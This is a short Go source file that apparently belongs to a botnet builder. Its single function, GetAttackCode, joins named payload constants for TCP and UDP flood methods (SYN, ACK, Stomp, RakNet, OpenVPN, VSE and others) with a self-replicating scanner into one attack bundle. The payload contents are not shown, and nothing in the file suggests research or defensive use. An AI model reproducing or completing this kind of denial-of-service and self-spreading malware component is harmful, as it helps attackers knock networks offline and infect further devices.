package payloads

import (
	"strings"
)

func GetAttackCode() string {
	var sb strings.Builder
	sb.WriteString(VSE)
	sb.WriteString(WRA)
	sb.WriteString(UDPTS)
	
	sb.WriteString(TCPSocket)
	sb.WriteString(TCPBypass)
	sb.WriteString(TCPSynData)
	sb.WriteString(TCPStomp)
	sb.WriteString(TCPSyn)
	sb.WriteString(TCPSocketHold)
	sb.WriteString(TCPAck)
	sb.WriteString(TCPBrazilianHandshake)
	sb.WriteString(UDPRaknet)
	sb.WriteString(UDPHex)
	sb.WriteString(UDPRaw)
	sb.WriteString(UDPPlain)
	sb.WriteString(UDPBypass)
	sb.WriteString(UDPOpenVPN)
	sb.WriteString(SelfRepScanner)
	return sb.String()
}
